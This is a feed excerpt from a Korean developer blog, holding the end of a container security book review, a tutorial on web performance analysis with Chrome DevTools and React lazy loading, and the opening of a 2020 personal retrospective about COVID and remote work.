<span class="dl">"</span><span class="s2">linux</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">resource</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">memory</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">limit</span><span class="dl">"</span><span class="p">:</span> <span class="mi">1000000</span>
<span class="p">},</span>
<span class="dl">"</span><span class="s2">devices</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">allow</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
<span class="dl">"</span><span class="s2">access</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">rwm</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">],</span>
<span class="dl">"</span><span class="s2">namespaces</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">pid</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">network</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ipc</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">uts</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">mount</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">]</span>
<span class="p">}</span>  
 <span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>컨테이너 이미지에 접근할 수 있는 사용자는 해당 이미지 안에 있는 어떤 파일에도 접근할 수 있게 됩니다. 때문에, 이미지에 패스워드나 인증 토큰과 같은 민감한 정보를 포함하는 것은 보안 취약점에 해당되므로 지양해야 합니다. 또한, 꼭 필요하지 않은 패키지나 라이브러리, 실행 파일은 이미지에 추가하지 않도록 주의해야 합니다.</p> <p>추가적으로 이미지를 보관하는 레지스트리와 관련된 내용과, 이미지 서명, 배치(deployment) 시점의 보안 점검 주의 사항들을 책을 통해 확인할 수 있습니다.</p> <h4 id="컨테이너-방화벽">컨테이너 방화벽</h4> <p>모든 외부 공격은 네트워크를 통해 도달되므로, 네트워크 보안을 위해 <code class="language-plaintext highlighter-rouge">컨테이너 방화벽</code>을 설정할 수 있습니다. 컨테이너 방화벽은 컨테이너 간의 트래픽을 제한하는데, 이에 따라 승인된 객체 사이에서만 정보가 오갈 수 있게 됩니다. 또한, 규칙에서 벗어난 네트워크 연결 시도를 기록하고 보고하는 기능도 제공하는데 이러한 기록을 통해 혹시 모를 공격의 전조를 감지할 수 있기도 합니다.</p> <hr/> <p>이 책은 아래 범주에 속하는 독자를 대상으로 하고 있습니다.</p> <ul> <li><code class="language-plaintext highlighter-rouge">ps</code>나 <code class="language-plaintext highlighter-rouge">grep</code>, <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">chown</code>, <code class="language-plaintext highlighter-rouge">chmod</code> 등의 기본적인 리눅스 명령어에 익숙한 사람</li> <li><code class="language-plaintext highlighter-rouge">docker</code>나 <code class="language-plaintext highlighter-rouge">kubectl</code> 등의 도구를 통해 컨테이너 응용 프로그램을 실행하고 관리해본 경험이 있는 사람</li> </ul> <p>다만 특정 컨테이너에 종속되어 설명된다기보단, 여러 컨테이너 구현들이 공통의 특징들을 많이 공유한다는 점을 강조하고자 다양한 컨테이너 도구들을 사용하며 설명해주고 있습니다. 또한 그 근간이 되는 기술에 대한 설명과 다양한 예시를 함께 제공해주어, 초보자라도 차근차근 따라갈 수 있는 난이도의 책이라 생각됩니다. 책의 마지막 부분인 부록의 <strong>보안 점검 목록</strong> 항목들을 통해, 먼저 운영 중인 컨테이너의 보안을 점검하기 위한 현황표를 작성하고 역으로 필요한 부분 순으로 읽는 것도 이 책을 활용하는 좋은 방법일 것 같습니다.</p> <p>개인적으로는 전자의 경우는 해당되나, 도커, 쿠버네티스 등의 컨테이너 관련 실무 경험이 부족하여 읽는 동안 다소 모호하게 이해되는 내용이 많았습니다. 아직까진 <code class="language-plaintext highlighter-rouge">Ubuntu</code>의 <code class="language-plaintext highlighter-rouge">CentOS</code> 혹은 <code class="language-plaintext highlighter-rouge">Windows</code> 서버 관리 경험만 있고, 도커와 쿠버네티스 등의 컨테이너 도구를 활용한 경험이 없어 추후 실무에 활용하게 된다면 다시 참고할만한 책이라고 생각합니다.</p> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://docs.docker.com/engine/security/">Docker security</a></p> <p>📌 <a href="https://www.hanbit.co.kr/store/books/look.php?p_code=B8383749156">한빛출판사: Container Security</a></p>]]></content><author><name></name></author><category term="글또"/><category term="리뷰"/><category term="container"/><category term="security"/><summary type="html"><![CDATA["한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."]]></summary></entry><entry><title type="html">웹 성능 분석 및 최적화 기법 (with Chrome Developer Tools)</title><link href="https://chanmi-lee.github.io/articles/2021-01/website-spped-and-performance-optimization/" rel="alternate" type="text/html" title="웹 성능 분석 및 최적화 기법 (with Chrome Developer Tools)"/><published>2021-01-24T00:00:00+00:00</published><updated>2021-01-24T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-01/website-spped-and-performance-optimization</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-01/website-spped-and-performance-optimization/"><![CDATA[<figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/web-performance-480.webp 480w,/assets/img/posts/web-performance-800.webp 800w,/assets/img/posts/web-performance-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/web-performance.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="웹-성능-분석-및-최적화-기법-with-chrome-developer-tools">웹 성능 분석 및 최적화 기법 (with Chrome Developer Tools)</h3> <p>웹의 성능 최적화 방법은 크게 로딩 성능과 렌더링 성능을 최적화하는 방법으로 나누어 생각할 수 있습니다.</p> <p>여기에서 <code class="language-plaintext highlighter-rouge">로딩 성능</code>은 <strong>얼마나 빠르게 리소스를 로드하는지</strong> 를 의미하며, <code class="language-plaintext highlighter-rouge">렌더링 성능</code>은 <strong>얼마나 빠르게 화면을 렌더링하고 있는가</strong> 를 의미합니다. 웹의 성능은 사용자 경험에 상당한 영향을 끼치는 항목으로, 프론트엔드 개발 시 반드시 고려해야 하는 중요한 내용입니다.</p> <p>다양한 성능 최적화 방법이 있지만, 그 중에서도 크롬 개발자도구를 활용하여 웹 사이트의 로딩 성능과 렌더링 성능과 관련된 지표들을 살펴보고 이를 통해 어떻게 성능을 개선할 수 있는지 살펴보겠습니다.</p> <h4 id="lighthouseaudit로-분석하기">Lighthouse(Audit)로 분석하기</h4> <p>먼저 분석하고자 하는 사이트에 들어가 개발자 도구의 <code class="language-plaintext highlighter-rouge">Lighthouse</code> 패널을 열고 <code class="language-plaintext highlighter-rouge">Generate report</code>를 누르면, 아래와 같이 분석 결과를 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/lighthouse-for-web-performance-480.webp 480w,/assets/img/posts/lighthouse-for-web-performance-800.webp 800w,/assets/img/posts/lighthouse-for-web-performance-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/lighthouse-for-web-performance.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>최상단에서 현재 웹 페이지를 <code class="language-plaintext highlighter-rouge">Performance</code>, <code class="language-plaintext highlighter-rouge">Accessibility</code>, <code class="language-plaintext highlighter-rouge">Best Practices</code>, <code class="language-plaintext highlighter-rouge">SEO</code>, <code class="language-plaintext highlighter-rouge">PWA</code>의 다섯가지 기준에 따라 분석 점수를 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/web-performance-of-us-480.webp 480w,/assets/img/posts/web-performance-of-us-800.webp 800w,/assets/img/posts/web-performance-of-us-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/web-performance-of-us.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>(<del>거의 0에 수렴하는 performance 점수.. (눈물)</del>)</p> <p>아래 구글의 점수와 비교해보면 그 차이를 바로 체감할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/web-performance-of-google-480.webp 480w,/assets/img/posts/web-performance-of-google-800.webp 800w,/assets/img/posts/web-performance-of-google-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/web-performance-of-google.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>이 중에서 Performance의 점수는 현재 페이지의 성능을 측정한 점수이며, 이는 Metrics 지표의 세부 항목을 기준으로 측정됩니다.</p> <ul> <li>First Contentful Paint</li> <li>Time to Interactive</li> <li>Speed Index</li> <li>Total Blocking Time</li> <li>Largest Contentful Paint</li> <li>Commulative Layout Shift</li> </ul> <p><code class="language-plaintext highlighter-rouge">Oppertunities</code>와 <code class="language-plaintext highlighter-rouge">Dignostics</code>는 현재 웹페이지의 문제점과 성능 최적화를 위한 가이드를 제시해주는 부분입니다.</p> <p><code class="language-plaintext highlighter-rouge">Opportunities</code>는 로딩 성능과 관련된 내용으로 어떻게 리소스를 더 빠르게 로딩할 수 있는지의 관점에서 개선 포인트를 나열해주고 있습니다. <code class="language-plaintext highlighter-rouge">Dignostics</code>는 렌더링 성능과 관련된 내용으로 그 개선점을 나열해주고 있습니다.</p> <p>각 항목의 상세 정보를 통해 리소스 별로 차지하는 비중을 확인할 수 있습니다. 예를 들어, <code class="language-plaintext highlighter-rouge">Opportunities</code>의 <code class="language-plaintext highlighter-rouge">Remove unused JavaScript</code> 항목을 선택하면, 어떤 리소스를 로딩하는데 오래 걸리는지, 각 사이즈는 어느정도인지 알 수 있습니다. 그러나 해당 리소스의 어느 부분이 문제가 되는지, 어떻게 개선해야 하는지 등에 관한 구체적인 정보는 제공되지 않습니다. (이어지는 <code class="language-plaintext highlighter-rouge">Performance</code> 패널을 통해 조금 더 구체적으로 확인이 가능합니다)</p> <p>마지막의 <code class="language-plaintext highlighter-rouge">Runtime Settings</code>에서는 검사를 실행한 환경에 대한 정보를 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/runtime-setting-in-lighthouse-480.webp 480w,/assets/img/posts/runtime-setting-in-lighthouse-800.webp 800w,/assets/img/posts/runtime-setting-in-lighthouse-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/runtime-setting-in-lighthouse.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="performance로-분석하기">Performance로 분석하기</h4> <p>Performance 패널에서는 <code class="language-plaintext highlighter-rouge">Timeline</code>을 기준으로 페이지가 로드되면서 실행되는 작업들에 관한 정보를 그래프와 화면들의 스냅샷으로 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/performance-for-web-page-480.webp 480w,/assets/img/posts/performance-for-web-page-800.webp 800w,/assets/img/posts/performance-for-web-page-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/performance-for-web-page.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <blockquote> <p>Frames</p> </blockquote> <p><code class="language-plaintext highlighter-rouge">Screenshots</code> 옵션을 활성화 한 경우 확인 가능하며, <code class="language-plaintext highlighter-rouge">Timeline</code>에 따른 렌더링 과정을 <code class="language-plaintext highlighter-rouge">스냅샷</code>을 통해 확인할 수 있습니다.</p> <blockquote> <p>Timings</p> </blockquote> <p>DCL, FP, FCP, LCP, L 등의 순서를 확인할 수 있으며 각각의 의미는 다음과 같습니다.</p> <ul> <li>DCL (DOMContentLoaded event) : HTML과 CSS parsing이 완료되는 시점으로 렌더 트리를 구성할 준비가 된 (DOM 및 CSSOM 구성이 끝난) 상황을 의미</li> <li>FP (First Paint) : 화면에 무언가 처음으로 그려지기 시작하는 순간</li> <li>FCP (First Contentful Paint) : 화면에 텍스트나 이미지가 출력되기 시작하는 순간</li> <li>FMP (First Meaningful Paint) : 사용자에게 의미있는 콘텐츠가 그려지기 시작하는 첫 순간으로, 콘텐츠 노출에 필요한 리소스(css, JavaScript file) 로드가 시작되고 스타일이 적용된 시점</li> <li>L (onload event) : HTML 상에 필요한 모든 리소스가 로드된 시점</li> </ul> <p>이 중 FMP의 시점이 가장 중요한데, <code class="language-plaintext highlighter-rouge">사용자에게 필요한 컨텐츠가 노출</code>되는 시점, 즉 웹 사이트에 대한 사용자의 첫 인상이 결정되는 순간이기 때문입니다. 때문에 FMP 시점을 앞당기는게 사용자 기준의 성능 최적화의 지표로 삼을 수 있습니다. 이 과정에서 어떤 컨텐츠가 가장 먼저 노출되어야 하는가에 대한 논의가 필요하며 개발 과정에 반영되어야 합니다.</p> <blockquote> <p>Tips: <code class="language-plaintext highlighter-rouge">DOMContentLoaded event</code> 와 <code class="language-plaintext highlighter-rouge">onload event</code>는 <code class="language-plaintext highlighter-rouge">Network</code> 패널 하단에서도 확인할 수 있습니다.</p> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/DCL-and-onload-in-network-480.webp 480w,/assets/img/posts/DCL-and-onload-in-network-800.webp 800w,/assets/img/posts/DCL-and-onload-in-network-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/DCL-and-onload-in-network.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <blockquote> <p>Main</p> </blockquote> <p><code class="language-plaintext highlighter-rouge">Timeline</code>에 따른 이벤트와 그에 따른 부작업을 확인할 수 있습니다.</p> <p>각각의 막대는 이벤트를 나타내며, 폭이 넓을 수록 오래 걸린 이벤트입니다. 각 이벤트 아래쪽의 이벤트들은 상단의 이벤트로부터 파생된 이벤트입니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/main-in-performance-480.webp 480w,/assets/img/posts/main-in-performance-800.webp 800w,/assets/img/posts/main-in-performance-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/main-in-performance.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="network로-분석하기">Network로 분석하기</h4> <p><code class="language-plaintext highlighter-rouge">Network</code>는 <code class="language-plaintext highlighter-rouge">Performance</code> 패널과 함께 레코딩되며, <code class="language-plaintext highlighter-rouge">웹 페이지가 로딩되는 동안 요청된 리소스 정보들</code>을 확인할 수 있습니다. 이 때 리소스 목록은 시간순으로 정렬되며, 아래와 같이 각 리소스의 서버 요청 대기 시간을 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/resource-detail-in-network-480.webp 480w,/assets/img/posts/resource-detail-in-network-800.webp 800w,/assets/img/posts/resource-detail-in-network-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/resource-detail-in-network.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ul> <li>Queuing : 대기열에 쌓아둔 시간</li> <li>Stalled : 요청을 보내기 전의 대기 시간, 즉 서버와 커넥션을 맺기까지의 시간</li> <li>Waiting (TTFB) : 초기 응답(Time To First Byte)을 받기까지 소비한 시간, 즉 서버 왕복 시간</li> <li>Content Download : 리소스 다운에 소요된 시간</li> </ul> <h4 id="성능-최적화-방법들">성능 최적화 방법들</h4> <p>❗ <strong>최대한 적게 요청하고, 최대한 빠르게 받아오기</strong></p> <p>앞에서 웹 성능 최적화는 크게 로딩 성능과 렌더링 성능로 분리하여 생각해볼 수 있다고 하였습니다. 로딩 성능과 렌더링 성능 각각의 관점에서 구체적인 최적화 방안들은 다음과 같습니다.</p> <blockquote> <p>로딩 성능 최적화</p> </blockquote> <ul> <li>리소스 최적화 <ul> <li>텍스트 압축</li> <li>이미지 사이즈 최적화 <ul> <li>개별 이미지 대신 이미지 스프라이트 사용 (<a href="https://www.w3schools.com/css/css_image_sprites.asp">CSS Image Sprites</a>)</li> <li>이미지 CDN을 통한 최적화</li> </ul> </li> <li>리소스 캐싱 (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching">MDN : HTTP Caching</a>)</li> <li>이미지 Preload &amp; Lazy load</li> <li>webpack 등의 번들러를 통한 번들된 리소스 활용</li> <li>컴포넌트 Preloading</li> </ul> </li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="code"><pre><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useState</span><span class="p">,</span> <span class="nx">useEffect</span><span class="p">,</span> <span class="nx">Suspense</span><span class="p">,</span> <span class="nx">lazy</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">react</span><span class="dl">'</span>

<span class="c1">// factory pattern</span>
<span class="kd">function</span> <span class="nf">lazyWithPreload</span><span class="p">(</span><span class="nx">lazyImport</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">const</span> <span class="nx">Component</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">lazy</span><span class="p">(</span><span class="nx">lazyImport</span><span class="p">)</span>
<span class="nx">Component</span><span class="p">.</span><span class="nx">preload</span> <span class="o">=</span> <span class="nx">lazyImport</span>
<span class="k">return</span> <span class="nx">Component</span>
<span class="p">}</span>

<span class="c1">// lazyLoad 대상이 되는 컴포넌트들을 선언</span>
<span class="kd">const</span> <span class="nx">lazyModal</span> <span class="o">=</span> <span class="nf">lazyWithPreload</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="k">import</span><span class="p">(</span><span class="dl">'</span><span class="s1">./components/ImageModal</span><span class="dl">'</span><span class="p">))</span>

<span class="kd">function</span> <span class="nf">App</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">showModal</span><span class="p">,</span> <span class="nx">setShowModal</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>

<span class="nf">useEffect</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">lazyModal</span><span class="p">.</span><span class="nf">preload</span><span class="p">()</span>
<span class="c1">// factory pattern을 사용하지 않는다면 아래와 같이 직접 import</span>
<span class="kd">const</span> <span class="nx">imageModal</span> <span class="o">=</span> <span class="k">import</span><span class="p">(</span><span class="dl">'</span><span class="s1">./component/ImageModal</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>

<span class="nf">render </span><span class="p">(</span>

<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="dl">"</span><span class="s2">App</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">Header</span> <span class="o">/&gt;</span>
<span class="p">...</span>
<span class="o">&lt;</span><span class="nx">Footer</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="nx">Suspense</span> <span class="nx">fallback</span><span class="o">=</span><span class="p">{</span><span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span><span class="nx">Loading</span><span class="p">...</span><span class="o">&lt;</span><span class="sr">/div&gt;}</span><span class="err">&gt;
</span><span class="p">{</span><span class="nx">showModal</span> <span class="p">?</span> <span class="o">&lt;</span><span class="nx">LazyModal</span> <span class="nx">closeModal</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setShowModal</span><span class="p">(</span><span class="kc">false</span><span class="p">)}</span> <span class="sr">/&gt; : ''</span><span class="err">}
</span><span class="o">&lt;</span><span class="sr">/Suspense</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span><span class="p">)</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p>렌더링 성능 최적화</p> </blockquote> <ul> <li>css는 HTML 문서 최상단(<code class="language-plaintext highlighter-rouge">&lt;head&gt;</code> 아래), script 태그는 HTML 문서 최하단(<code class="language-plaintext highlighter-rouge">&lt;/body&gt;</code> 직전)에 작성</li> </ul> <figure class="highlight"><pre><code class="language-html" data-lang="html"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="code"><pre><span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"style.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div&gt;</span>...<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"app.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</pre></td></tr></tbody></table></code></pre></figure> <p><strong>Why?</strong></p> <blockquote> <p>렌더 트리를 구성하기 위해서는 <code class="language-plaintext highlighter-rouge">DOM 트리</code>와 <code class="language-plaintext highlighter-rouge">CSSOM 트리</code>가 필요합니다. DOM 트리는 파싱 중 태그를 발견할 때마다 순차적 구성이 가능하나, CSSOM 트리는 CSS를 모두 해석해야 구성이 가능합니다. 때문에 CSS는 렌더링 차단 리소스라고 하며, 렌더링이 되지 않도록 항상 <code class="language-plaintext highlighter-rouge">&lt;head&gt;</code> 아래에 작성해야 합니다.</p> </blockquote> <ul> <li><code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>의 <code class="language-plaintext highlighter-rouge">defer</code>,<code class="language-plaintext highlighter-rouge">async</code> 속성 활용 <ul> <li>단, 브라우저별로 지원 범위가 상이함 (<strong><a href="https://caniuse.com">can I use</a></strong> 에서 확인)</li> </ul> </li> <li>병목 코드 개선 - 반복 호출 제거 - 중복 코드 제거 - 만능 유틸 사용을 지양하고 필요한 기능만 활용 - ex) lodash 사용 시 필요한 함수만 부분적으로 사용 혹은 직접 필요한 모듈 구현하기</li> </ul> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="code"><pre>  <span class="c1">// instead of</span>
  <span class="k">import</span> <span class="err">\</span><span class="nx">_</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span>
  <span class="c1">// use</span>
  <span class="k">import</span> <span class="p">{</span> <span class="kd">get</span><span class="p">,</span> <span class="nx">reduce</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span>
  
</pre></td></tr></tbody></table></code></pre></figure> <ul> <li><code class="language-plaintext highlighter-rouge">repaint</code>, <code class="language-plaintext highlighter-rouge">reflow</code> 줄이기 <ul> <li>DOM 및 스타일 변경 최소화</li> <li>불필요한 마크업 사용 지양</li> <li>…</li> </ul> </li> </ul> <hr/> <p>요약하자면, 웹 성능 최적화를 위해서는 먼저</p> <p>(1) <strong>브라우저 렌더링 과정</strong>을 이해하고</p> <p><code class="language-plaintext highlighter-rouge">(리소스 다운로드 -&gt; HTML &amp; CSS 파싱 -&gt; 스타일 (DOM, CSSOM를 조합한 렌더 트리 구성) -&gt; 레이아웃 -&gt; 페인트 -&gt; 합성)</code></p> <p>(2) 개발자 도구에서 제공하는 여러가지 지표들을 통해 <strong>병목 구간</strong>을 찾아내고</p> <p>(3) 이를 <strong>점진적으로 개선</strong>하는 노력이 필요합니다.</p> <p>개발자 도구 외에도 <a href="https://create-react-app.dev/docs/analyzing-the-bundle-size/">source-map-explorer</a>, <a href="https://www.npmjs.com/package/webpack-bundle-analyzer">webpack-bundle-analyzer</a>, <a href="https://github.com/svengau/cra-bundle-analyzer">cra-bundle-analyzer</a> (CRA에서 <code class="language-plaintext highlighter-rouge">eject</code> 없이 사용할 수 있어 앞의 두 방법에 비해 추천!) 등의 라이브러리를 활용하거나 아래 사이트를 참고하는 방안도 고려해봄직 합니다.</p> <ul> <li><a href="https://www.webpagetest.org/">WEB PAGE TEST</a></li> <li><a href="https://developers.google.com/speed/pagespeed/insights/">PageSpeed Insights</a></li> <li><a href="https://web.dev/measure/">web.dev - Measure</a></li> </ul> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://developers.google.com/web/tools/chrome-devtools/evaluate-performance">Chrome DevTools - Performance</a></p> <p>📌 <a href="https://web.dev/fast">web.dev - Fase load times</a></p> <p>📌 <a href="https://developer.mozilla.org/en-US/docs/Learn/Performance">MDN - Web Performance</a></p> <p>📌 <a href="https://ui.toast.com/fe-guide/ko_PERFORMANCE">TOAST - 성능 최적화</a></p> <p>📌 <a href="https://tv.naver.com/v/4578425">DEVIEW2018 - 웹 성능 최적화에 필요한 브라우저의 모든 것</a></p>]]></content><author><name></name></author><category term="WebPerformance"/><category term="Optimize"/><category term="DeveloperTools"/><category term="WebVitals"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">2020년 하반기 회고</title><link href="https://chanmi-lee.github.io/articles/2020-12/retrospective-of-2020/" rel="alternate" type="text/html" title="2020년 하반기 회고"/><published>2020-12-27T00:00:00+00:00</published><updated>2020-12-27T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-12/retrospective-of-2020</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-12/retrospective-of-2020/"><![CDATA[<h3 id="2020년-하반기-회고">2020년 하반기 회고</h3> <p>상반기 회고를 작성한게 얼마전 같은데, 벌써 12월의 마지막 주말이 되어 지난 하반기와 함께 한 해를 돌아보고자 한다.</p> <h4 id="-covid-그리고-wfh">😷 COVID 그리고 WFH</h4> <p>1월 말, 설 연휴 무렵이었을까. 당시만 하더라도 기관지가 예민하거나 미세먼지에 취약한 편이 아니라면 굳이 <code class="language-plaintext highlighter-rouge">마스크</code>를 쟁여둘만한 이유가 없었던 때였다. 그런데 갑자기 마스크 구매가 폭증하고, 덩달아 가격도 말도 안되게 오르기 시작했다. 회사에서 주문/결제 도메인을 담당하는 팀에 속한 덕분에(?) 다행이게도 조금 빠르게 함께 사는 가족들이 사용할 수 있을 정도의 마스크를 그래도 합리적인 가격에 구매할 수 있었다.</p> <p>충분하지 못한 마스크 공급량이 수요량을 견디지 못해 일시품절되는 경우가 빈번하게 발생했다. 매번 마스크가 풀리는 시간대마다 트래픽이 급증했고, 마스크 5부제라는 나름의 신박한 대안과 충분한 공급량이 뒷받침되기 전까지 동일한 현상이 랜덤하게 발생하였다.</p> <p>회사의 배려와 함께 시작된 <code class="language-plaintext highlighter-rouge">재택근무</code>가 2021년을 며칠 남기지 않은 지금까지, 거의 1년 가까운 기간동안 지속될거란 예상은 전혀 하지 못했다. 메르스나 그 전의 상황처럼 길어봐야 몇 달 정도겠거니- 라고 생각했다. 줌을 통한 팀 미팅과 업무 관련 회의, 올핸즈 미팅, 심지어 온라인 팀회식까지 경험하며 느낀 점은 재택근무가 조금은 먼 미래의 일이라고 생각했으나 나를 포함한 대다수가 예상보다 빠르게 적응하고 있고, 적당히 멀어진 사회적 관계가 좋으면서도 한편으로는 이전의 평범한 일상이 그립기도 했다.</p> <p>2021년을 맞이하는 시점인 지금은 매일같이 확진자수가 천명을 넘고 있어 언제 어디서 걸릴지 모르는 상황인지라, 재택근무 덕분에 적어도 출퇴근길에 마주하게 될 혹시 모를 감염으로부터의 걱정에서 벗어난 것만으로도 참 감사하다.</p> <hr/> <h4 id="언택트를-넘어-온택트">언택트를 넘어 온택트</h4> <p>코로나 영향으로, 거의 대부분의 컨퍼런스와 밋업 등의 모임이 <code class="language-plaintext highlighter-rouge">온라인-라이브</code>로 진행되었다. 2019년 연말 즈음에 참석한 오프라인 행사 이후로는 오프라인으로 진행된 모임을 찾아보기가 힘들 정도로 온라인이 대세였다.</p> <p>if kakao, DEVIEW 2020, 우아한 테크콘서트 등의 굵직한 행사들도 온라인으로 진행되었다. 작년까지만 하더라도 워낙 신청률이 높아 하나라도 당첨되기가 어려워 후기나 뒤늦게 올라오는 영상을 보고 아쉬움을 달랬는데, 코로나 덕분에 누릴 수 있는 몇 안되는 좋은 점들 중 하나가 아닌가 싶다.</p> <p>연말이나 연휴 시즌마다 종종 찾던 공연장이나 영화관은 언택트를 강조하는 분위기 속에 